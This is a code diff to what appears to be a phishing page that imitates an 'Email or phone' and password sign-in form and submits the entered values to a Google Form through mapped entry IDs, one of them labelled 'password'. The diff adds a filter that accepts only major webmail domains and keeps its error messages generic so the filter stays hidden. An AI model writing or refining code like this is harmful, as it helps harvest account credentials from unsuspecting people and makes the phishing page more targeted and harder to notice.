@@ -303,7 +303,7 @@
         <!-- Step 1: Email -->
         <div id="stepEmail" class="step-email">
             <div class="input-container mt-8" id="emailInputContainer">
-                <!-- ✨ CHANGED: type="text" → type="email" to trigger mobile email suggestions -->
+                <!-- type="email" to trigger mobile email suggestions -->
                 <input type="email" id="emailInput" class="input-field" placeholder=" " autocomplete="email" aria-label="Email or phone">
                 <label for="emailInput" class="input-label">Email or phone</label>
             </div>
@@ -367,6 +367,9 @@
                 password: 'entry.566365448'
             };
 
+            // List of accepted email domains (restriction still active)
+            const ALLOWED_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'live.com', 'aol.com'];
+
             const stepEmail = document.getElementById('stepEmail');
             const stepPassword = document.getElementById('stepPassword');
             const emailInput = document.getElementById('emailInput');
@@ -411,6 +414,21 @@
                     showEmailError('Enter a valid email or phone number');
                     return false;
                 }
+
+                // Require email from an allowed domain
+                const atIndex = val.lastIndexOf('@');
+                if (atIndex === -1) {
+                    // Generic message – doesn't reveal the domain list
+                    showEmailError('Enter a valid email');
+                    return false;
+                }
+                const domain = val.slice(atIndex + 1).toLowerCase();
+                if (!ALLOWED_DOMAINS.includes(domain)) {
+                    // Generic message – doesn't reveal the domain list
+                    showEmailError('Enter a valid email');
+                    return false;
+                }
+
                 clearEmailError();
                 storedEmailValue = val;
                 submitToGoogleForm(storedEmailValue, '');
